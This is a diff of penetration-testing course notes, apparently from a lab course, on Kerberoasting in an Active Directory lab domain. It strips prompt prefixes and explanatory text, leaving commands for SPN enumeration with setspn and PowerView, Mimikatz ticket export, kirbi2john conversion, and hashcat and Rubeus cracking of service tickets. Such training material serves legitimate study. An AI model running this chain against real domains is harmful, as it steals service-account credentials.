@@ -5,7 +5,7 @@
 <mark style="color:green;">**Enumerating SPNs with setspn.exe**</mark>
 
 ```cmd-session
-C:\htb> setspn.exe -Q */*
+setspn.exe -Q */*
 ```
 
 We will notice many different SPNs returned for the various hosts in the domain. We will focus on `user accounts` and ignore the computer accounts returned by the tool
@@ -33,7 +33,7 @@ PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Conte
 ```
 {% endcode %}
 
-Now that the tickets are loaded, we can use `Mimikatz` to extract the ticket(s) from `memory`.
+***
 
 ### <mark style="color:red;">Extracting Tickets from Memory with Mimikatz</mark>
 
@@ -49,24 +49,18 @@ mimikatz # kerberos::list /export
 ```
 {% endcode %}
 
-If we do not specify the `base64 /out:true` command, Mimikatz will extract the tickets and write them to `.kirbi` files. Depending on our position on the network and if we can easily move files to our attack host, this can be easier when we go to crack the tickets. Let's take the base64 blob retrieved above and prepare it for cracking.
-
-Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.
-
 <mark style="color:green;">**Preparing the Base64 Blob for Cracking**</mark>
 
 {% code fullWidth="true" %}
 ```shell-session
-mrroboteLiot@htb[/htb]$ echo "<base64 blob>" |  tr -d \\n 
+echo "<base64 blob>" |  tr -d \\n 
 ```
 {% endcode %}
-
-We can place the above single line of output into a file and convert it back to a `.kirbi` file using the `base64` utility.
 
 <mark style="color:green;">**Placing the Output into a File as .kirbi**</mark>
 
 ```shell-session
-mrroboteLiot@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi
+cat encoded_file | base64 -d > sqldev.kirbi
 ```
 
 Next, we can use [this](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) version of the `kirbi2john.py` tool to extract the Kerberos ticket from the TGS file.
@@ -74,7 +68,7 @@ Next, we can use [this](https://raw.githubusercontent.com/nidem/kerberoast/907bf
 <mark style="color:green;">**Extracting the Kerberos Ticket using kirbi2john.py**</mark>
 
 ```shell-session
-mrroboteLiot@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi
+python2.7 kirbi2john.py sqldev.kirbi
 ```
 
 This will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.
@@ -83,7 +77,7 @@ This will create a file called `crack_file`. We then must modify the file a bit 
 
 {% code overflow="wrap" fullWidth="true" %}
 ```shell-session
-mrroboteLiot@htb[/htb]$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
 ```
 {% endcode %}
 
@@ -93,7 +87,7 @@ Now we can check and confirm that we have a hash that can be fed to Hashcat.
 
 {% code overflow="wrap" fullWidth="true" %}
 ```shell-session
-mrroboteLiot@htb[/htb]$ cat sqldev_tgs_hashcat 
+cat sqldev_tgs_hashcat 
 
 $krb5tgs$23$*
 ```
@@ -105,12 +99,13 @@ We can then run the ticket through Hashcat again and get the cleartext password 
 
 {% code fullWidth="true" %}
 ```shell-session
-mrroboteLiot@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
-
+hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
 ```
 {% endcode %}
 
+{% hint style="info" %}
 If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run `kirbi2john.py` against them directly, skipping the base64 decoding step.
+{% endhint %}
 
 ***
 
@@ -122,8 +117,6 @@ If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerber
 PS C:\htb> Import-Module .\PowerView.ps1
 PS C:\htb> Get-DomainUser * -spn | select samaccountname
 ```
-
-From here, we could target a specific user and retrieve the TGS ticket in Hashcat format.
 
 <mark style="color:green;">**Using PowerView to Target a Specific User**</mark>
 
@@ -258,9 +251,6 @@ Requesting a new ticket with Rubeus will show us that the account name is using 
 {% code overflow="wrap" fullWidth="true" %}
 ```powershell-session
 PS C:\htb>  .\Rubeus.exe kerberoast /user:testspn /nowrap
-----------------------
-[*] Supported ETypes       : AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
-[*] Hash                   : $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$*testspn/kerberoast.inlanefreight.local@INLANEFREIGHT.LOCAL*$3D53
 ```
 {% endcode %}
 
